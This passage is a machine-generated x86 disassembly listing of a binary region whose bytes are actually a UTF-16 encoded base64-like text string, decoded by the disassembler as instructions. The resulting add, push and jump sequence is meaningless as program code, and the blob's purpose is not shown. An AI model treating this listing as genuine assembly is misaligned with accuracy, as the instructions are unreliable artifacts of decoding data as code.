  409be8:	43                   	inc    %ebx
  409be9:	00 50 00             	add    %dl,0x0(%eax)
  409bec:	2f                   	das
  409bed:	00 79 00             	add    %bh,0x0(%ecx)
  409bf0:	53                   	push   %ebx
  409bf1:	00 30                	add    %dh,(%eax)
  409bf3:	00 4f 00             	add    %cl,0x0(%edi)
  409bf6:	5a                   	pop    %edx
  409bf7:	00 79 00             	add    %bh,0x0(%ecx)
  409bfa:	58                   	pop    %eax
  409bfb:	00 39                	add    %bh,(%ecx)
  409bfd:	00 2f                	add    %ch,(%edi)
  409bff:	00 39                	add    %bh,(%ecx)
  409c01:	00 41 00             	add    %al,0x0(%ecx)
  409c04:	6d                   	insl   (%dx),%es:(%edi)
  409c05:	00 4e 00             	add    %cl,0x0(%esi)
  409c08:	49                   	dec    %ecx
  409c09:	00 33                	add    %dh,(%ebx)
  409c0b:	00 5a 00             	add    %bl,0x0(%edx)
  409c0e:	73 00                	jae    0x409c10
  409c10:	44                   	inc    %esp
  409c11:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  409c15:	00 57 00             	add    %dl,0x0(%edi)
  409c18:	6d                   	insl   (%dx),%es:(%edi)
  409c19:	00 47 00             	add    %al,0x0(%edi)
  409c1c:	2b 00                	sub    (%eax),%eax
  409c1e:	75 00                	jne    0x409c20
  409c20:	70 00                	jo     0x409c22
  409c22:	4e                   	dec    %esi
  409c23:	00 57 00             	add    %dl,0x0(%edi)
  409c26:	2b 00                	sub    (%eax),%eax
  409c28:	71 00                	jno    0x409c2a
  409c2a:	7a 00                	jp     0x409c2c
  409c2c:	52                   	push   %edx
  409c2d:	00 37                	add    %dh,(%edi)
  409c2f:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  409c33:	00 6e 00             	add    %ch,0x0(%esi)
  409c36:	58                   	pop    %eax
  409c37:	00 67 00             	add    %ah,0x0(%edi)
  409c3a:	57                   	push   %edi
  409c3b:	00 76 00             	add    %dh,0x0(%esi)
  409c3e:	58                   	pop    %eax
  409c3f:	00 71 00             	add    %dh,0x0(%ecx)
  409c42:	4e                   	dec    %esi
  409c43:	00 2f                	add    %ch,(%edi)
  409c45:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  409c49:	00 68 00             	add    %ch,0x0(%eax)
  409c4c:	68 00 55 00 39       	push   $0x39005500
  409c51:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  409c55:	00 50 00             	add    %dl,0x0(%eax)
  409c58:	4c                   	dec    %esp
  409c59:	00 6f 00             	add    %ch,0x0(%edi)
  409c5c:	62 00                	bound  %eax,(%eax)
  409c5e:	55                   	push   %ebp
  409c5f:	00 62 00             	add    %ah,0x0(%edx)
  409c62:	6d                   	insl   (%dx),%es:(%edi)
  409c63:	00 38                	add    %bh,(%eax)
  409c65:	00 51 00             	add    %dl,0x0(%ecx)
  409c68:	4e                   	dec    %esi
  409c69:	00 53 00             	add    %dl,0x0(%ebx)
  409c6c:	76 00                	jbe    0x409c6e
  409c6e:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  409c72:	67 00 6f 00          	add    %ch,0x0(%bx)
  409c76:	61                   	popa
  409c77:	00 77 00             	add    %dh,0x0(%edi)
  409c7a:	56                   	push   %esi
  409c7b:	00 77 00             	add    %dh,0x0(%edi)
  409c7e:	43                   	inc    %ebx
  409c7f:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  409c83:	00 45 00             	add    %al,0x0(%ebp)
  409c86:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  409c8a:	63 00                	arpl   %eax,(%eax)
  409c8c:	45                   	inc    %ebp
  409c8d:	00 4d 00             	add    %cl,0x0(%ebp)
  409c90:	51                   	push   %ecx
  409c91:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  409c95:	00 4b 00             	add    %cl,0x0(%ebx)
  409c98:	2b 00                	sub    (%eax),%eax
  409c9a:	43                   	inc    %ebx
  409c9b:	00 58 00             	add    %bl,0x0(%eax)
  409c9e:	7a 00                	jp     0x409ca0
  409ca0:	78 00                	js     0x409ca2
  409ca2:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  409ca6:	35 00 72 00 4d       	xor    $0x4d007200,%eax
  409cab:	00 70 00             	add    %dh,0x0(%eax)
  409cae:	78 00                	js     0x409cb0
  409cb0:	33 00                	xor    (%eax),%eax
  409cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  409cb3:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  409cb7:	00 71 00             	add    %dh,0x0(%ecx)
  409cba:	4a                   	dec    %edx
  409cbb:	00 4e 00             	add    %cl,0x0(%esi)
  409cbe:	41                   	inc    %ecx
  409cbf:	00 47 00             	add    %al,0x0(%edi)
  409cc2:	46                   	inc    %esi
  409cc3:	00 63 00             	add    %ah,0x0(%ebx)
  409cc6:	34 00                	xor    $0x0,%al
  409cc8:	43                   	inc    %ebx
  409cc9:	00 31                	add    %dh,(%ecx)
  409ccb:	00 32                	add    %dh,(%edx)
  409ccd:	00 57 00             	add    %dl,0x0(%edi)
  409cd0:	66 00 62 00          	data16 add %ah,0x0(%edx)
  409cd4:	32 00                	xor    (%eax),%al
  409cd6:	70 00                	jo     0x409cd8
  409cd8:	78 00                	js     0x409cda
  409cda:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  409cde:	38 00                	cmp    %al,(%eax)
  409ce0:	32 00                	xor    (%eax),%al
  409ce2:	69 00 68 00 73 00    	imul   $0x730068,(%eax),%eax
  409ce8:	50                   	push   %eax
  409ce9:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  409ced:	00 32                	add    %dh,(%edx)
  409cef:	00 76 00             	add    %dh,0x0(%esi)
  409cf2:	41                   	inc    %ecx
  409cf3:	00 73 00             	add    %dh,0x0(%ebx)
  409cf6:	45                   	inc    %ebp
  409cf7:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  409cfb:	00 30                	add    %dh,(%eax)
  409cfd:	00 41 00             	add    %al,0x0(%ecx)
  409d00:	34 00                	xor    $0x0,%al
  409d02:	6e                   	outsb  %ds:(%esi),(%dx)
  409d03:	00 6d 00             	add    %ch,0x0(%ebp)
  409d06:	62 00                	bound  %eax,(%eax)
  409d08:	49                   	dec    %ecx
  409d09:	00 58 00             	add    %bl,0x0(%eax)
  409d0c:	58                   	pop    %eax
  409d0d:	00 36                	add    %dh,(%esi)
  409d0f:	00 53 00             	add    %dl,0x0(%ebx)
  409d12:	45                   	inc    %ebp
  409d13:	00 52 00             	add    %dl,0x0(%edx)
  409d16:	73 00                	jae    0x409d18
  409d18:	5a                   	pop    %edx
  409d19:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d1c:	4c                   	dec    %esp
  409d1d:	00 68 00             	add    %ch,0x0(%eax)
  409d20:	76 00                	jbe    0x409d22
  409d22:	78 00                	js     0x409d24
  409d24:	34 00                	xor    $0x0,%al
  409d26:	62 00                	bound  %eax,(%eax)
  409d28:	2f                   	das
  409d29:	00 31                	add    %dh,(%ecx)
  409d2b:	00 76 00             	add    %dh,0x0(%esi)
  409d2e:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  409d32:	70 00                	jo     0x409d34
  409d34:	72 00                	jb     0x409d36
  409d36:	2f                   	das
  409d37:	00 36                	add    %dh,(%esi)
  409d39:	00 59 00             	add    %bl,0x0(%ecx)
  409d3c:	54                   	push   %esp
  409d3d:	00 70 00             	add    %dh,0x0(%eax)
  409d40:	4b                   	dec    %ebx
  409d41:	00 46 00             	add    %al,0x0(%esi)
  409d44:	47                   	inc    %edi
  409d45:	00 69 00             	add    %ch,0x0(%ecx)
  409d48:	53                   	push   %ebx
  409d49:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d4c:	68 00 30 00 31       	push   $0x31003000
  409d51:	00 2f                	add    %ch,(%edi)
  409d53:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  409d57:	00 65 00             	add    %ah,0x0(%ebp)
  409d5a:	47                   	inc    %edi
  409d5b:	00 30                	add    %dh,(%eax)
  409d5d:	00 72 00             	add    %dh,0x0(%edx)
  409d60:	30 00                	xor    %al,(%eax)
  409d62:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  409d66:	35 00 4f 00 35       	xor    $0x35004f00,%eax
  409d6b:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  409d6f:	00 70 00             	add    %dh,0x0(%eax)
  409d72:	37                   	aaa
  409d73:	00 48 00             	add    %cl,0x0(%eax)
  409d76:	6d                   	insl   (%dx),%es:(%edi)
  409d77:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d7a:	39 00                	cmp    %eax,(%eax)
  409d7c:	61                   	popa
  409d7d:	00 48 00             	add    %cl,0x0(%eax)
  409d80:	31 00                	xor    %eax,(%eax)
  409d82:	31 00                	xor    %eax,(%eax)
  409d84:	77 00                	ja     0x409d86
  409d86:	69 00 38 00 2f 00    	imul   $0x2f0038,(%eax),%eax
  409d8c:	47                   	inc    %edi
  409d8d:	00 39                	add    %bh,(%ecx)
  409d8f:	00 46 00             	add    %al,0x0(%esi)
  409d92:	61                   	popa
  409d93:	00 66 00             	add    %ah,0x0(%esi)
  409d96:	43                   	inc    %ebx
  409d97:	00 37                	add    %dh,(%edi)
  409d99:	00 6a 00             	add    %ch,0x0(%edx)
  409d9c:	7a 00                	jp     0x409d9e
  409d9e:	32 00                	xor    (%eax),%al
  409da0:	6c                   	insb   (%dx),%es:(%edi)
  409da1:	00 2b                	add    %ch,(%ebx)
  409da3:	00 56 00             	add    %dl,0x0(%esi)
  409da6:	48                   	dec    %eax
  409da7:	00 43 00             	add    %al,0x0(%ebx)
  409daa:	47                   	inc    %edi
  409dab:	00 63 00             	add    %ah,0x0(%ebx)
  409dae:	33 00                	xor    (%eax),%eax
  409db0:	62 00                	bound  %eax,(%eax)
  409db2:	4e                   	dec    %esi
  409db3:	00 67 00             	add    %ah,0x0(%edi)
  409db6:	5a                   	pop    %edx
  409db7:	00 41 00             	add    %al,0x0(%ecx)
  409dba:	58                   	pop    %eax
  409dbb:	00 41 00             	add    %al,0x0(%ecx)
  409dbe:	63 00                	arpl   %eax,(%eax)
  409dc0:	79 00                	jns    0x409dc2
  409dc2:	6c                   	insb   (%dx),%es:(%edi)
  409dc3:	00 55 00             	add    %dl,0x0(%ebp)
  409dc6:	77 00                	ja     0x409dc8
  409dc8:	2b 00                	sub    (%eax),%eax
  409dca:	68 00 42 00 75       	push   $0x75004200
  409dcf:	00 69 00             	add    %ch,0x0(%ecx)
  409dd2:	69 00 49 00 31 00    	imul   $0x310049,(%eax),%eax
  409dd8:	77 00                	ja     0x409dda
  409dda:	77 00                	ja     0x409ddc
  409ddc:	6d                   	insl   (%dx),%es:(%edi)
  409ddd:	00 58 00             	add    %bl,0x0(%eax)
  409de0:	34 00                	xor    $0x0,%al
  409de2:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  409de6:	5a                   	pop    %edx
  409de7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409deb:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  409def:	00 36                	add    %dh,(%esi)
  409df1:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409df5:	00 35 00 6e 00 49    	add    %dh,0x49006e00
  409dfb:	00 7a 00             	add    %bh,0x0(%edx)
  409dfe:	6e                   	outsb  %ds:(%esi),(%dx)
  409dff:	00 51 00             	add    %dl,0x0(%ecx)
  409e02:	4b                   	dec    %ebx
  409e03:	00 32                	add    %dh,(%edx)
  409e05:	00 77 00             	add    %dh,0x0(%edi)
  409e08:	5a                   	pop    %edx
  409e09:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  409e0d:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  409e11:	00 4f 00             	add    %cl,0x0(%edi)
  409e14:	54                   	push   %esp
  409e15:	00 6d 00             	add    %ch,0x0(%ebp)
  409e18:	6c                   	insb   (%dx),%es:(%edi)
  409e19:	00 35 00 4e 00 76    	add    %dh,0x76004e00
  409e1f:	00 38                	add    %bh,(%eax)
  409e21:	00 4b 00             	add    %cl,0x0(%ebx)
  409e24:	67 00 77 00          	add    %dh,0x0(%bx)
  409e28:	42                   	inc    %edx
  409e29:	00 52 00             	add    %dl,0x0(%edx)
  409e2c:	43                   	inc    %ebx
  409e2d:	00 46 00             	add    %al,0x0(%esi)
  409e30:	68 00 41 00 32       	push   $0x32004100
  409e35:	00 6a 00             	add    %ch,0x0(%edx)
  409e38:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  409e3c:	32 00                	xor    (%eax),%al
  409e3e:	76 00                	jbe    0x409e40
  409e40:	6f                   	outsl  %ds:(%esi),(%dx)
  409e41:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e44:	74 00                	je     0x409e46
  409e46:	53                   	push   %ebx
  409e47:	00 63 00             	add    %ah,0x0(%ebx)
  409e4a:	59                   	pop    %ecx
  409e4b:	00 59 00             	add    %bl,0x0(%ecx)
  409e4e:	49                   	dec    %ecx
  409e4f:	00 4a 00             	add    %cl,0x0(%edx)
  409e52:	66 00 50 00          	data16 add %dl,0x0(%eax)
  409e56:	55                   	push   %ebp
  409e57:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  409e5b:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  409e5f:	00 42 00             	add    %al,0x0(%edx)
  409e62:	51                   	push   %ecx
  409e63:	00 45 00             	add    %al,0x0(%ebp)
  409e66:	45                   	inc    %ebp
  409e67:	00 31                	add    %dh,(%ecx)
  409e69:	00 49 00             	add    %cl,0x0(%ecx)
  409e6c:	73 00                	jae    0x409e6e
  409e6e:	77 00                	ja     0x409e70
  409e70:	6a 00                	push   $0x0
  409e72:	56                   	push   %esi
  409e73:	00 6b 00             	add    %ch,0x0(%ebx)
  409e76:	6d                   	insl   (%dx),%es:(%edi)
  409e77:	00 51 00             	add    %dl,0x0(%ecx)
  409e7a:	63 00                	arpl   %eax,(%eax)
  409e7c:	7a 00                	jp     0x409e7e
  409e7e:	57                   	push   %edi
  409e7f:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409e83:	00 77 00             	add    %dh,0x0(%edi)
  409e86:	66 00 33             	data16 add %dh,(%ebx)
  409e89:	00 5a 00             	add    %bl,0x0(%edx)
  409e8c:	2b 00                	sub    (%eax),%eax
  409e8e:	46                   	inc    %esi
  409e8f:	00 2f                	add    %ch,(%edi)
  409e91:	00 5a 00             	add    %bl,0x0(%edx)
  409e94:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  409e98:	41                   	inc    %ecx
  409e99:	00 45 00             	add    %al,0x0(%ebp)
  409e9c:	6e                   	outsb  %ds:(%esi),(%dx)
  409e9d:	00 69 00             	add    %ch,0x0(%ecx)
  409ea0:	39 00                	cmp    %eax,(%eax)
  409ea2:	59                   	pop    %ecx
  409ea3:	00 63 00             	add    %ah,0x0(%ebx)
  409ea6:	43                   	inc    %ebx
  409ea7:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  409eab:	00 71 00             	add    %dh,0x0(%ecx)
  409eae:	62 00                	bound  %eax,(%eax)
  409eb0:	59                   	pop    %ecx
  409eb1:	00 76 00             	add    %dh,0x0(%esi)
  409eb4:	31 00                	xor    %eax,(%eax)
  409eb6:	59                   	pop    %ecx
  409eb7:	00 73 00             	add    %dh,0x0(%ebx)
  409eba:	32 00                	xor    (%eax),%al
  409ebc:	37                   	aaa
  409ebd:	00 45 00             	add    %al,0x0(%ebp)
  409ec0:	36 00 33             	add    %dh,%ss:(%ebx)
  409ec3:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  409ec7:	00 78 00             	add    %bh,0x0(%eax)
  409eca:	53                   	push   %ebx
  409ecb:	00 38                	add    %bh,(%eax)
  409ecd:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ed0:	48                   	dec    %eax
  409ed1:	00 35 00 6d 00 62    	add    %dh,0x62006d00
  409ed7:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  409edb:	00 6b 00             	add    %ch,0x0(%ebx)
  409ede:	61                   	popa
  409edf:	00 57 00             	add    %dl,0x0(%edi)
  409ee2:	35 00 74 00 71       	xor    $0x71007400,%eax
  409ee7:	00 4f 00             	add    %cl,0x0(%edi)
  409eea:	76 00                	jbe    0x409eec
  409eec:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  409ef0:	49                   	dec    %ecx
  409ef1:	00 53 00             	add    %dl,0x0(%ebx)
  409ef4:	44                   	inc    %esp
  409ef5:	00 62 00             	add    %ah,0x0(%edx)
  409ef8:	76 00                	jbe    0x409efa
  409efa:	56                   	push   %esi
  409efb:	00 6d 00             	add    %ch,0x0(%ebp)
  409efe:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409f02:	70 00                	jo     0x409f04
  409f04:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  409f07:	00 70 00             	add    %dh,0x0(%eax)
  409f0a:	2f                   	das
  409f0b:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  409f0f:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  409f13:	00 78 00             	add    %bh,0x0(%eax)
  409f16:	72 00                	jb     0x409f18
  409f18:	7a 00                	jp     0x409f1a
  409f1a:	2b 00                	sub    (%eax),%eax
  409f1c:	46                   	inc    %esi
  409f1d:	00 6f 00             	add    %ch,0x0(%edi)
  409f20:	50                   	push   %eax
  409f21:	00 66 00             	add    %ah,0x0(%esi)
  409f24:	77 00                	ja     0x409f26
  409f26:	67 00 34             	add    %dh,(%si)
  409f29:	00 47 00             	add    %al,0x0(%edi)
  409f2c:	31 00                	xor    %eax,(%eax)
  409f2e:	57                   	push   %edi
  409f2f:	00 75 00             	add    %dh,0x0(%ebp)
  409f32:	4d                   	dec    %ebp
  409f33:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f36:	47                   	inc    %edi
  409f37:	00 41 00             	add    %al,0x0(%ecx)
  409f3a:	30 00                	xor    %al,(%eax)
  409f3c:	70 00                	jo     0x409f3e
  409f3e:	5a                   	pop    %edx
  409f3f:	00 43 00             	add    %al,0x0(%ebx)
  409f42:	5a                   	pop    %edx
  409f43:	00 41 00             	add    %al,0x0(%ecx)
  409f46:	56                   	push   %esi
  409f47:	00 41 00             	add    %al,0x0(%ecx)
  409f4a:	66 00 57 00          	data16 add %dl,0x0(%edi)
  409f4e:	41                   	inc    %ecx
  409f4f:	00 56 00             	add    %dl,0x0(%esi)
  409f52:	4f                   	dec    %edi
  409f53:	00 35 00 48 00 4f    	add    %dh,0x4f004800
  409f59:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f5c:	59                   	pop    %ecx
  409f5d:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  409f61:	00 63 00             	add    %ah,0x0(%ebx)
  409f64:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  409f68:	62 00                	bound  %eax,(%eax)
  409f6a:	31 00                	xor    %eax,(%eax)
  409f6c:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  409f70:	72 00                	jb     0x409f72
  409f72:	74 00                	je     0x409f74
  409f74:	5a                   	pop    %edx
  409f75:	00 50 00             	add    %dl,0x0(%eax)
  409f78:	4b                   	dec    %ebx
  409f79:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  409f7d:	00 56 00             	add    %dl,0x0(%esi)
  409f80:	51                   	push   %ecx
  409f81:	00 6a 00             	add    %ch,0x0(%edx)
  409f84:	31 00                	xor    %eax,(%eax)
  409f86:	51                   	push   %ecx
  409f87:	00 70 00             	add    %dh,0x0(%eax)
  409f8a:	2b 00                	sub    (%eax),%eax
  409f8c:	58                   	pop    %eax
  409f8d:	00 43 00             	add    %al,0x0(%ebx)
  409f90:	70 00                	jo     0x409f92
  409f92:	51                   	push   %ecx
  409f93:	00 4b 00             	add    %cl,0x0(%ebx)
  409f96:	79 00                	jns    0x409f98
  409f98:	79 00                	jns    0x409f9a
  409f9a:	6c                   	insb   (%dx),%es:(%edi)
  409f9b:	00 6d 00             	add    %ch,0x0(%ebp)
  409f9e:	74 00                	je     0x409fa0
  409fa0:	33 00                	xor    (%eax),%eax
  409fa2:	63 00                	arpl   %eax,(%eax)
  409fa4:	56                   	push   %esi
  409fa5:	00 32                	add    %dh,(%edx)
  409fa7:	00 68 00             	add    %ch,0x0(%eax)
  409faa:	59                   	pop    %ecx
  409fab:	00 62 00             	add    %ah,0x0(%edx)
  409fae:	33 00                	xor    (%eax),%eax
  409fb0:	37                   	aaa
  409fb1:	00 70 00             	add    %dh,0x0(%eax)
  409fb4:	56                   	push   %esi
  409fb5:	00 59 00             	add    %bl,0x0(%ecx)
  409fb8:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  409fbc:	6c                   	insb   (%dx),%es:(%edi)
  409fbd:	00 33                	add    %dh,(%ebx)
  409fbf:	00 7a 00             	add    %bh,0x0(%edx)
  409fc2:	47                   	inc    %edi
  409fc3:	00 4b 00             	add    %cl,0x0(%ebx)
  409fc6:	57                   	push   %edi
  409fc7:	00 7a 00             	add    %bh,0x0(%edx)
  409fca:	2b 00                	sub    (%eax),%eax
  409fcc:	6d                   	insl   (%dx),%es:(%edi)
  409fcd:	00 5a 00             	add    %bl,0x0(%edx)
  409fd0:	32 00                	xor    (%eax),%al
  409fd2:	64 00 74 00 35       	add    %dh,%fs:0x35(%eax,%eax,1)
  409fd7:	00 66 00             	add    %ah,0x0(%esi)
  409fda:	4d                   	dec    %ebp
  409fdb:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  409fdf:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  409fe3:	00 6a 00             	add    %ch,0x0(%edx)
  409fe6:	74 00                	je     0x409fe8
  409fe8:	5a                   	pop    %edx
  409fe9:	00 61 00             	add    %ah,0x0(%ecx)
  409fec:	31 00                	xor    %eax,(%eax)
  409fee:	54                   	push   %esp
  409fef:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  409ff3:	00 4b 00             	add    %cl,0x0(%ebx)
  409ff6:	75 00                	jne    0x409ff8
  409ff8:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  409ffc:	4a                   	dec    %edx
  409ffd:	00 57 00             	add    %dl,0x0(%edi)
  40a000:	30 00                	xor    %al,(%eax)
  40a002:	46                   	inc    %esi
  40a003:	00 36                	add    %dh,(%esi)
  40a005:	00 75 00             	add    %dh,0x0(%ebp)
  40a008:	31 00                	xor    %eax,(%eax)
  40a00a:	39 00                	cmp    %eax,(%eax)
  40a00c:	50                   	push   %eax
  40a00d:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40a011:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a014:	6d                   	insl   (%dx),%es:(%edi)
  40a015:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40a019:	00 59 00             	add    %bl,0x0(%ecx)
  40a01c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a01d:	00 48 00             	add    %cl,0x0(%eax)
  40a020:	76 00                	jbe    0x40a022
  40a022:	4b                   	dec    %ebx
  40a023:	00 37                	add    %dh,(%edi)
  40a025:	00 69 00             	add    %ch,0x0(%ecx)
  40a028:	62 00                	bound  %eax,(%eax)
  40a02a:	4f                   	dec    %edi
  40a02b:	00 68 00             	add    %ch,0x0(%eax)
  40a02e:	75 00                	jne    0x40a030
  40a030:	72 00                	jb     0x40a032
  40a032:	48                   	dec    %eax
  40a033:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40a037:	00 45 00             	add    %al,0x0(%ebp)
  40a03a:	42                   	inc    %edx
  40a03b:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a03f:	00 32                	add    %dh,(%edx)
  40a041:	00 39                	add    %bh,(%ecx)
  40a043:	00 59 00             	add    %bl,0x0(%ecx)
  40a046:	79 00                	jns    0x40a048
  40a048:	7a 00                	jp     0x40a04a
  40a04a:	70 00                	jo     0x40a04c
  40a04c:	31 00                	xor    %eax,(%eax)
  40a04e:	54                   	push   %esp
  40a04f:	00 37                	add    %dh,(%edi)
  40a051:	00 73 00             	add    %dh,0x0(%ebx)
  40a054:	4c                   	dec    %esp
  40a055:	00 76 00             	add    %dh,0x0(%esi)
  40a058:	76 00                	jbe    0x40a05a
  40a05a:	39 00                	cmp    %eax,(%eax)
  40a05c:	57                   	push   %edi
  40a05d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a060:	61                   	popa
  40a061:	00 68 00             	add    %ch,0x0(%eax)
  40a064:	4a                   	dec    %edx
  40a065:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40a069:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40a06d:	00 69 00             	add    %ch,0x0(%ecx)
  40a070:	57                   	push   %edi
  40a071:	00 51 00             	add    %dl,0x0(%ecx)
  40a074:	45                   	inc    %ebp
  40a075:	00 73 00             	add    %dh,0x0(%ebx)
  40a078:	48                   	dec    %eax
  40a079:	00 49 00             	add    %cl,0x0(%ecx)
  40a07c:	2b 00                	sub    (%eax),%eax
  40a07e:	42                   	inc    %edx
  40a07f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a082:	48                   	dec    %eax
  40a083:	00 70 00             	add    %dh,0x0(%eax)
  40a086:	5a                   	pop    %edx
  40a087:	00 43 00             	add    %al,0x0(%ebx)
  40a08a:	41                   	inc    %ecx
  40a08b:	00 61 00             	add    %ah,0x0(%ecx)
  40a08e:	73 00                	jae    0x40a090
  40a090:	33 00                	xor    (%eax),%eax
  40a092:	6d                   	insl   (%dx),%es:(%edi)
  40a093:	00 4e 00             	add    %cl,0x0(%esi)
  40a096:	77 00                	ja     0x40a098
  40a098:	4d                   	dec    %ebp
  40a099:	00 4e 00             	add    %cl,0x0(%esi)
  40a09c:	42                   	inc    %edx
  40a09d:	00 4f 00             	add    %cl,0x0(%edi)
  40a0a0:	45                   	inc    %ebp
  40a0a1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0a4:	47                   	inc    %edi
  40a0a5:	00 4e 00             	add    %cl,0x0(%esi)
  40a0a8:	54                   	push   %esp
  40a0a9:	00 41 00             	add    %al,0x0(%ecx)
  40a0ac:	33 00                	xor    (%eax),%eax
  40a0ae:	47                   	inc    %edi
  40a0af:	00 52 00             	add    %dl,0x0(%edx)
  40a0b2:	34 00                	xor    $0x0,%al
  40a0b4:	37                   	aaa
  40a0b5:	00 50 00             	add    %dl,0x0(%eax)
  40a0b8:	51                   	push   %ecx
  40a0b9:	00 30                	add    %dh,(%eax)
  40a0bb:	00 63 00             	add    %ah,0x0(%ebx)
  40a0be:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a0c2:	37                   	aaa
  40a0c3:	00 59 00             	add    %bl,0x0(%ecx)
  40a0c6:	4b                   	dec    %ebx
  40a0c7:	00 52 00             	add    %dl,0x0(%edx)
  40a0ca:	4e                   	dec    %esi
  40a0cb:	00 68 00             	add    %ch,0x0(%eax)
  40a0ce:	58                   	pop    %eax
  40a0cf:	00 72 00             	add    %dh,0x0(%edx)
  40a0d2:	39 00                	cmp    %eax,(%eax)
  40a0d4:	42                   	inc    %edx
  40a0d5:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40a0d9:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40a0dd:	00 47 00             	add    %al,0x0(%edi)
  40a0e0:	62 00                	bound  %eax,(%eax)
  40a0e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0e3:	00 62 00             	add    %ah,0x0(%edx)
  40a0e6:	77 00                	ja     0x40a0e8
  40a0e8:	4c                   	dec    %esp
  40a0e9:	00 79 00             	add    %bh,0x0(%ecx)
  40a0ec:	47                   	inc    %edi
  40a0ed:	00 6e 00             	add    %ch,0x0(%esi)
  40a0f0:	72 00                	jb     0x40a0f2
  40a0f2:	33 00                	xor    (%eax),%eax
  40a0f4:	73 00                	jae    0x40a0f6
  40a0f6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0f7:	00 38                	add    %bh,(%eax)
  40a0f9:	00 30                	add    %dh,(%eax)
  40a0fb:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a0ff:	00 41 00             	add    %al,0x0(%ecx)
  40a102:	43                   	inc    %ebx
  40a103:	00 36                	add    %dh,(%esi)
  40a105:	00 47 00             	add    %al,0x0(%edi)
  40a108:	56                   	push   %esi
  40a109:	00 72 00             	add    %dh,0x0(%edx)
  40a10c:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a110:	6e                   	outsb  %ds:(%esi),(%dx)
  40a111:	00 4f 00             	add    %cl,0x0(%edi)
  40a114:	4b                   	dec    %ebx
  40a115:	00 41 00             	add    %al,0x0(%ecx)
  40a118:	76 00                	jbe    0x40a11a
  40a11a:	73 00                	jae    0x40a11c
  40a11c:	57                   	push   %edi
  40a11d:	00 46 00             	add    %al,0x0(%esi)
  40a120:	72 00                	jb     0x40a122
  40a122:	4d                   	dec    %ebp
  40a123:	00 48 00             	add    %cl,0x0(%eax)
  40a126:	6a 00                	push   $0x0
  40a128:	54                   	push   %esp
  40a129:	00 4f 00             	add    %cl,0x0(%edi)
  40a12c:	53                   	push   %ebx
  40a12d:	00 36                	add    %dh,(%esi)
  40a12f:	00 45 00             	add    %al,0x0(%ebp)
  40a132:	33 00                	xor    (%eax),%eax
  40a134:	45                   	inc    %ebp
  40a135:	00 6a 00             	add    %ch,0x0(%edx)
  40a138:	53                   	push   %ebx
  40a139:	00 58 00             	add    %bl,0x0(%eax)
  40a13c:	59                   	pop    %ecx
